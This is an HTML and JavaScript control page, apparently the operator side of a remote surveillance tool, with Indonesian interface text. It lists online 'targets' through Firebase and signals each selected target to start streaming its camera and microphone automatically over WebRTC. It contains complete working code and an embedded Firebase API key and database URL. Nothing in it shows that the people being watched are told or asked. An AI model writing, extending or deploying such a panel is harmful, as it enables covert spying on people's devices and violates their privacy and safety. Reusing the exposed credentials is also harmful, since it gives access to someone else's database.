<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Master Monitor v6</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
        #sidebar { width: 280px; border-right: 1px solid #00ff00; padding: 15px; overflow-y: auto; }
        #content { flex: 1; padding: 20px; display: flex; flex-direction: column; }
        .tgt-item { border: 1px solid #00ff00; padding: 10px; margin-bottom: 10px; cursor: pointer; border-radius: 4px; }
        .tgt-item.active { background: #003300; box-shadow: 0 0 10px #00ff00; }
        #video-container { flex: 1; background: #0a0a0a; border: 2px solid #00ff00; position: relative; border-radius: 8px; overflow: hidden; }
        video { width: 100%; height: 100%; object-fit: contain; }
        #btn-start { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
                     color: #00ff00; display: flex; align-items: center; justify-content: center; font-size: 20px; cursor: pointer; z-index: 100; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="sidebar">
        <h3>ACTIVE TARGETS</h3>
        <div id="target-list">Menunggu target...</div>
    </div>
    <div id="content">
        <div id="video-container">
            <div id="btn-start">KLIK UNTUK MENGAKTIFKAN PANEL</div>
            <video id="rv" autoplay playsinline></video>
        </div>
        <div id="info" style="margin-top:15px;">Pilih target untuk memulai monitoring otomatis.</div>
    </div>

    <script>
        const config = {
            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "chatroom-e9b3f"
        };
        firebase.initializeApp(config);
        const rootDb = firebase.database().ref('v6_sync');

        let activeId = null;
        let pc = null;
        let isUserActive = false;

        document.getElementById('btn-start').onclick = function() {
            this.classList.add('hidden');
            isUserActive = true;
            document.getElementById('rv').play();
        };

        // 1. List Target yang Online
        rootDb.on('value', snapshot => {
            const list = document.getElementById('target-list');
            list.innerHTML = "";
            const data = snapshot.val();
            if (!data) return;

            Object.keys(data).forEach(id => {
                const t = data[id];
                const isOnline = (Date.now() - (t.presence || 0)) < 10000;
                
                if (isOnline) {
                    const el = document.createElement('div');
                    el.className = `tgt-item ${id === activeId ? 'active' : ''}`;
                    el.innerHTML = `ID: ${id}<br><small>STATUS: LIVE</small>`;
                    el.onclick = () => selectTarget(id);
                    list.appendChild(el);

                    // AUTO-RESYNC: Jika target yang sedang aktif kirim offer baru
                    if (id === activeId && t.sdp && t.sdp.offer && t.sdp.offer.ts > (window.lastOfferTs || 0)) {
                        window.lastOfferTs = t.sdp.offer.ts;
                        handleOffer(id, t.sdp.offer);
                    }
                }
            });
        });

        async function handleOffer(id, offer) {
            console.log("Menerima Offer, mengirim Answer...");
            if (pc) pc.close();
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });

            pc.ontrack = e => {
                const rv = document.getElementById('rv');
                rv.srcObject = e.streams[0];
                if(isUserActive) rv.muted = false;
            };

            pc.onicecandidate = e => {
                if (e.candidate) rootDb.child(id + '/ice_m').push(e.candidate.toJSON());
            };

            await pc.setRemoteDescription(new RTCSessionDescription(offer));
            const answer = await pc.createAnswer();
            await pc.setLocalDescription(answer);
            rootDb.child(id + '/sdp/answer').set({ type: answer.type, sdp: answer.sdp });

            // Bersihkan listener ICE lama agar tidak duplikat
            rootDb.child(id + '/ice_t').off();
            rootDb.child(id + '/ice_t').on('child_added', s => {
                pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e=>{});
            });
        }

        async function selectTarget(id) {
            if (activeId) {
                // Beritahu target lama bahwa kita berhenti memantau
                rootDb.child(activeId + '/monitor_ping').remove();
            }
            
            activeId = id;
            window.lastOfferTs = 0;
            document.getElementById('info').innerText = `Menyambungkan ke ${id}...`;

            // TRIGGER: Kirim 'ping' ke Firebase. Target akan melihat ini dan kirim Offer otomatis.
            // Gunakan timestamp agar target tahu ini ping baru (akibat refresh monitor)
            rootDb.child(id + '/monitor_ping').set(Date.now());
        }

        // Jika Monitor di-refresh, saat dimuat ulang ia akan memilih target terakhir (jika ada)
        // atau kita biarkan user memilih lagi untuk memastikan interaksi suara aktif.
    </script>
</body>
</html>
